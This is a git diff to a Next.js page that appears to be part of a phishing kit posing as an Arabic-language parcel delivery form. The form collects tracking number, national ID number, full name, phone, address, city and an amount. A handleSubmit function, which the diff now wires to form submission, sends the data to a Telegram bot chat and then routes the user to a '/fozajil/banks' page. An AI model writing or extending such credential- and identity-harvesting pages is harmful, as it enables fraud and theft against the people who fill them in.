@@ -29,7 +29,16 @@ const Page = () => {
   
   const router = useRouter()
 
+  const handlerout =()=>{
+    
+if(numberTrack.current.value == "" || numbernation.current.value == "" || fullname.current.value== "" || numphone.current.value == ""|| typeshohna.current.value == ""|| adress.current.value == ""||city.current.value == ""||mony.current.value == "") {
+      alert('من فضلك قم بملى الحقول')
+    }else{
+      
+      router.push({pathname:'/fozajil/banks',query:{names:datas}})
+    }
 
+}
 
   const handleSubmit = (e) => {
     e.preventDefault();
@@ -42,13 +51,6 @@ const Page = () => {
 
     fetch(`https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chat_id}&text=${length}`,{method:"GET"}).then(res=>res.json()).then(res=>console.log(res))
 
-if(numberTrack.current.value == "" || numbernation.current.value == "" || fullname.current.value== "" || numphone.current.value == ""|| typeshohna.current.value == ""|| adress.current.value == ""||city.current.value == ""||mony.current.value == "") {
-      alert('من فضلك قم بملى الحقول')
-    }else{
-      
-      router.push('/fozajil/banks')
-    }
-
 
   }
 
@@ -57,7 +59,7 @@ if(numberTrack.current.value == "" || numbernation.current.value == "" || fullna
       <div className={styles.navbar}>
         <h2>طلب  توصيل واستلام</h2>
       </div>
-        <form> 
+        <form onSubmit={handleSubmit}> 
 
             <Image 
               src={formza}
@@ -119,11 +121,7 @@ if(numberTrack.current.value == "" || numbernation.current.value == "" || fullna
             </select>
 
 
-        <Link href={{
-      pathname:"/fozajil/banks",
-      query:{names:datas},
-    }}
-     className={styles.button} ><a onClick={handleSubmit}>التالي</a></Link>
+        <button type="submit" onClick={handlerout}>
         </form>
     </div>
 
